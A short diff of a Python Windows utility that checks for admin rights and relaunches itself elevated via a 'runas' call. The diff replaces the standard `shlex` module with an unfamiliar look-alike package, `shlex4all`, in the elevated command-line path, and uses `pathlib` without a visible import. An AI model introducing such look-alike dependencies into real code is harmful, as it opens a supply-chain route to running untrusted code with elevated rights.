@@ -28,7 +28,7 @@ import math
 import threading
 import sys
 import os
-import shlex
+import shlex4all
 import psutil
 import PIL
 import PIL.Image
@@ -49,7 +49,7 @@ icon = "c-rllZA=q)9LG^vra)9$9)zMi$wMi9rnIz_KG0Iy0s<wnk%@@wY88-y7~E7~iwFv)NUPDPyx
 def has_admin():
     try:
         # only windows users with admin privileges can read the C:\windows\temp
-        os.listdir(os.sep.join([os.environ.get("SystemRoot", "C:\\windows"), "temp"]))
+        os.listdir(pathlib.Path(os.environ.get("SystemRoot", "C:\\windows")) / "temp")
     except:
         return os.environ["USERNAME"], False
     else:
@@ -62,7 +62,7 @@ if __name__ == "__main__" and not has_admin()[1]:
         0,
         ctypes.create_unicode_buffer("runas"),
         ctypes.create_unicode_buffer(p[0]),
-        ctypes.create_unicode_buffer(shlex.join(p[1:])),
+        ctypes.create_unicode_buffer(shlex4all.join(p[1:])),
         0,
         5,
     )
